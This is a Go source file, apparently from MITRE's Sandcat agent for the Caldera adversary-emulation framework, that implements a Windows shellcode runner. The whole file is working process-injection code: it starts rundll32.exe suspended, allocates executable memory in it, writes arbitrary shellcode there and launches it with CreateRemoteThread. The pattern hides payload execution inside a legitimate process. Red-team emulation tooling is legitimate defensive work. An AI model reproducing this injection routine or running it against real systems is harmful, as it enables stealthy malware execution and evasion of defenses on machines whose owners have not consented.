// +build windows

package donut

import (
	"syscall"
	"unsafe"

	"github.com/mitre/sandcat/gocat/executors/execute"
	"github.com/mitre/sandcat/gocat/util"
)

var (
	kernel32           *syscall.DLL
	ntdll              *syscall.DLL
	VirtualAllocEx     *syscall.Proc
	WriteProcessMemory *syscall.Proc
	CreateRemoteThread *syscall.Proc
)

// Runner runner
func Runner(donut []byte) (bool, string) {

	handle, _, _, _ := CreateSuspendedProcessWIORedirect("rundll32.exe")

	//handle, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, 13704)

	//TODO: Change to RX
	address, _, err := VirtualAllocEx.Call(uintptr(unsafe.Pointer(handle)), 0, uintptr(len(donut)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if util.CheckErrorMessage(err) {
		return false, execute.ERROR_PID
	}

	_, _, err = WriteProcessMemory.Call(uintptr(unsafe.Pointer(handle)), address, (uintptr)(unsafe.Pointer(&donut[0])), uintptr(len(donut)))
	if util.CheckErrorMessage(err) {
		return false, execute.ERROR_PID
	}

	_, _, err = CreateRemoteThread.Call(uintptr(unsafe.Pointer(handle)), 0, 0, address, 0, 0, 0)
	if util.CheckErrorMessage(err) {
		return false, execute.ERROR_PID
	}

	return true, execute.SUCCESS_PID
}

// IsAvailable does a shellcode runner exist
func IsAvailable() bool {
	var kernel32Err, ntdllErr, vAllocErr, writeProcessMemoryErr, remoteThreadErr error
	kernel32, kernel32Err = syscall.LoadDLL("kernel32.dll")
	ntdll, ntdllErr = syscall.LoadDLL("ntdll.dll")
	VirtualAllocEx, vAllocErr = kernel32.FindProc("VirtualAllocEx")
	WriteProcessMemory, writeProcessMemoryErr = kernel32.FindProc("WriteProcessMemory")
	CreateRemoteThread, remoteThreadErr = kernel32.FindProc("CreateRemoteThread")


	if kernel32Err != nil && ntdllErr != nil && vAllocErr != nil && writeProcessMemoryErr != nil && remoteThreadErr != nil {
		return false
	}
	return true
}